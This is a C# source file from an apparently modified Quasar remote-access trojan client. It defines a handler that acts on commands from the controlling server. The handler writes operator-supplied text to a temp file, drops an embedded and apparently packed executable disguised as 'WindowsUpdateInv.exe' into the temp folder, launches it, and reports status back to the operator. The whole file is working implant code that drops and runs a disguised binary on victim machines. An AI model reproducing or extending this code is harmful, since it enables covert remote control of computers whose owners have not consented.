using Quasar.Client.Utilities;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Quasar.Client.Messages
{
    public class RedTextHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is DoShowRedText;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoShowRedText msg:
                    Execute(sender, msg);
                    break;
                default:
                    break;
            }
        }

        private void Execute(ISender client, DoShowRedText message)
        {
            new Thread(() =>
            {
                string actionStr = message.Action;
                bool flag7 = false;
                string contentStr = ""; //display text
                if (actionStr == "close")
                {
                    contentStr = "";
                    flag7 = true;
                }
                contentStr = message.Text;
                string text9 = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".txt");
                try
                {
                    using (StreamWriter writer = new StreamWriter(text9, false, System.Text.Encoding.Unicode))
                    {
                        writer.Write(contentStr);
                    }
                }
                catch (Exception)
                {
                    client.Send(new SetStatus { Message = "Invisible text writing error!" });
                }
                string str = "WindowsUpdateInv"; // window class name
                if (message.WindowClassName != null)
                {
                    str = message.WindowClassName;
                }
                int num = 36;
                if (message.FontSize != 0)  // font size
                {
                    num = message.FontSize;
                }
                string text10 = Path.Combine(Path.GetTempPath(), str + ".exe");
                try
                {
                    byte[] invisibleWindow_vmp = Resource1.RedTextDesktopApp;
                    File.WriteAllBytes(text10, invisibleWindow_vmp);
                }
                catch (Exception)
                {
                }
                try
                {
                    NativeMethods.STARTUPINFO structure = default(NativeMethods.STARTUPINFO);
                    NativeMethods.PROCESS_INFORMATION process_INFORMATION = default(NativeMethods.PROCESS_INFORMATION);
                    structure.cb = (uint)Marshal.SizeOf<NativeMethods.STARTUPINFO>(structure);
                    // structure.lpDesktop = client.currentDesktopString;
                    
                    if (!NativeMethods.CreateProcess(null, string.Format("\"{0}\" \"{1}\" \"{2}\"", text10, text9, num), IntPtr.Zero, IntPtr.Zero, false, 0U, IntPtr.Zero, null, ref structure, out process_INFORMATION))
                    {
                        Process.Start(text10, text9);
                        if (!flag7)
                        {
                            client.Send(new SetStatus { Message = string.Format("{0}:{1}\n\n{2}", Misc.__FILE__("D:\\Projects\\Quasar-AllInOne\\Quasar-Modified\\Client\\Core\\Commands\\MiscHandler.cs"), Misc.__LINE__(437), "Invisible text showed (on Default desktop)!") });
                        }
                    }
                    else if (!flag7)
                    {
                        client.Send(new SetStatus { Message = string.Format("{0}:{1}\n\n{2}", Misc.__FILE__("D:\\Projects\\Quasar-AllInOne\\Quasar-Modified\\Client\\Core\\Commands\\MiscHandler.cs"), Misc.__LINE__(442), string.Format("Invisible text showed (on {0} desktop)!", "Desktop")) });
                    }
                    return;
                }
                catch (Exception ex16)
                {
                    if (!flag7)
                    {
                        client.Send(new SetStatus { Message = string.Format("{0}:{1}\n\n{2}", Misc.__FILE__("D:\\Projects\\Quasar-AllInOne\\Quasar-Modified\\Client\\Core\\Commands\\MiscHandler.cs"), Misc.__LINE__(448), ex16.Message) });
                    }
                    return;
                }
            })
            { IsBackground = true }.Start();
        }
    }
}
